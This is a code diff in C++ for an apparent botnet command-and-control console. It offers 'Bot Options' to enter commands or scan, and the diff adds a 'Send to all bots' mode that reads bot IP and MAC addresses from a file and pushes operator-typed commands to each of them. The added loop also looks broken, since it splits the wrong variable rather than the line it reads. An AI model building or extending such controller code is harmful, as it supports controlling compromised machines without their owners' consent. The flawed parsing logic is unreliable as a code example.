@@ -151,23 +151,61 @@ int main()
  *Return: 0 success, 1 Failure
  */
 int mode_manager(std::string option, std::string address, std::string mac_addr) {
-	//enter connected mode to send and receive packets
-	if (option == "1") {
-		std::string command = "";
-		std::cout << "1)Enter command" << std::endl;
-		std::cin >> command;
-		//send packet
-		send_packet(address, mac_addr, option, false);
-		//check for response
-		//enter command mode
-		connected_mode_send(address, mac_addr, option, command);
+	//check to see if the packets are getting sent to all addresses
+	if (address == "y") {
+		//open file
+		std::ifstream myfile("psh_ack_tcp_header.txt");
+		if (myfile.is_open()) {
+			//parse file
+			std::string line;
+			getline(myfile, line);
+			while (!myfile.eof()) {
+				std::vector<std::string> addresses;
+				split(mac_addr, ' ', addresses);
+				address = addresses[0];
+				mac_addr = addresses[1];
+				//enter connected mode to send and receive packets
+				if (option == "1") {
+					std::string command = "";
+					std::cout << "1)Enter command" << std::endl;
+					std::cin >> command;
+					//send packet
+					send_packet(address, mac_addr, option, false);
+					//check for response
+					//enter command mode
+					connected_mode_send(address, mac_addr, option, command);
+				}
+				//enter connection-less mode
+				else if (option == "2") {
+					//send packet with specific header length
+				}
+				else
+					return 1; //error
+				getline(myfile, line);
+			}
+			//close file
+			myfile.close();
+		}
 	}
-	//enter connection-less mode
-	else if(option == "2"){
-		//send packet with specific header length
+	else {
+		//enter connected mode to send and receive packets
+		if (option == "1") {
+			std::string command = "";
+			std::cout << "1)Enter command" << std::endl;
+			std::cin >> command;
+			//send packet
+			send_packet(address, mac_addr, option, false);
+			//check for response
+			//enter command mode
+			connected_mode_send(address, mac_addr, option, command);
+		}
+		//enter connection-less mode
+		else if (option == "2") {
+			//send packet with specific header length
+		}
+		else
+			return 1; //error
 	}
-	else
-		return 1; //error
 
 	return 0; //success
 }
@@ -181,26 +219,36 @@ DWORD WINAPI command_console(PVOID pPARAM) {
 	std::string option = "";
 	std::string address = "";
 	std::string mac_addr = "";
+	std::string answer = "";
 
 	//create interface
 	printf("Bot Options:\n1:Enter Commands\n2:Scan\n");
 	std::cin >> option;
-	printf("Enter IP Address or 1 to List Bots:\n");
-	std::cin >> address;
-	printf("Enter MAC Address or 1 to List Bots:\n");
-	std::cin >> mac_addr;
-	if (address == "1" || mac_addr == "1") {
-		address = "";
-		mac_addr = "";
-		//////List address function//////
-		printf("Enter IP Address:\n");
+	printf("Send to all bots [y/n]: ");
+	std::cin >> answer;
+	if (answer == "y") {
+		mode_manager(option, "y", "1");
+	}
+	else if (answer == "n") {
+		printf("Enter IP Address or 1 to List Bots:\n");
 		std::cin >> address;
-		printf("Enter MAC Address:\n");
+		printf("Enter MAC Address or 1 to List Bots:\n");
 		std::cin >> mac_addr;
-		mode_manager(option, address, mac_addr);
+		if (address == "1" || mac_addr == "1") {
+			address = "";
+			mac_addr = "";
+			//////List address function//////
+			printf("Enter IP Address:\n");
+			std::cin >> address;
+			printf("Enter MAC Address:\n");
+			std::cin >> mac_addr;
+			mode_manager(option, address, mac_addr);
+		}
+		else
+			mode_manager(option, address, mac_addr);
 	}
 	else
-		mode_manager(option, address, mac_addr);
+		return -1;
 
 	return 0;
 }
